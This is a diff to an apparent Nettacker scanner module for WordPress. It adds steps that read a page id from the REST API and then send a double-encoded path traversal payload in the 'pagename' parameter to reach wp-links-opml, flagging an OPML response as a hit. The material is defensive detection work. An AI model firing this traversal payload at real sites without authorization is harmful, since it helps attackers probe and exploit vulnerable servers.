@@ -24,6 +24,136 @@ info:
     - wordpress
 
 payloads:
+  # Discover a published page id first, then use it for the traversal.
+  - library: http
+    steps:
+      - method: get
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+        allow_redirects: false
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/?rest_route=/wp/v2/pages&per_page=1&_fields=id"
+            prefix: ""
+            suffix: ""
+            interceptors: ""
+            data:
+              schema:
+                - "http"
+              ports:
+                - 80
+        response:
+          save_to_temp_events_only: wp_page_id_http
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200"
+              reverse: false
+            content:
+              regex: '"id":(\d+)'
+              reverse: false
+
+      - method: get
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+        allow_redirects: false
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}?page_id=dependent_on_temp_event[0]['content'][0]&pagename={{dir_suffix}}%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fwp-links-opml"
+            prefix: ""
+            suffix: ""
+            interceptors: ""
+            data:
+              schema:
+                - "http"
+              ports:
+                - 80
+              dir_suffix:
+                - "template"
+                - "templates"
+                - "sections"
+                - "layouts"
+        response:
+          dependent_on_temp_event: wp_page_id_http
+          log: Detected via REST API page discovery  
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200"
+              reverse: false
+            content:
+              regex: <opml
+              reverse: false
+
+  - library: http
+    steps:
+      - method: get
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+        allow_redirects: false
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/?rest_route=/wp/v2/pages&per_page=1&_fields=id"
+            prefix: ""
+            suffix: ""
+            interceptors: ""
+            data:
+              schema:
+                - "https"
+              ports:
+                - 443
+        response:
+          save_to_temp_events_only: wp_page_id_https
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200"
+              reverse: false
+            content:
+              regex: '"id":(\d+)'
+              reverse: false
+
+      - method: get
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+        allow_redirects: false
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}?page_id=dependent_on_temp_event[0]['content'][0]&pagename={{dir_suffix}}%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fwp-links-opml"
+            prefix: ""
+            suffix: ""
+            interceptors: ""
+            data:
+              schema:
+                - "https"
+              ports:
+                - 443
+              dir_suffix:
+                - "template"
+                - "templates"
+                - "sections"
+                - "layouts"
+        response:
+          dependent_on_temp_event: wp_page_id_https
+          log: Detected via REST API page discovery  
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200"
+              reverse: false
+            content:
+              regex: <opml
+              reverse: false
+
+  # Fallback when the REST API is disabled: probe common page ids.
   - library: http
     steps:
       - method: get
@@ -62,6 +192,7 @@ payloads:
                 - "sections"
                 - "layouts"
         response:
+          log: Detected via page ID fuzzing
           condition_type: and
           conditions:
             status_code:
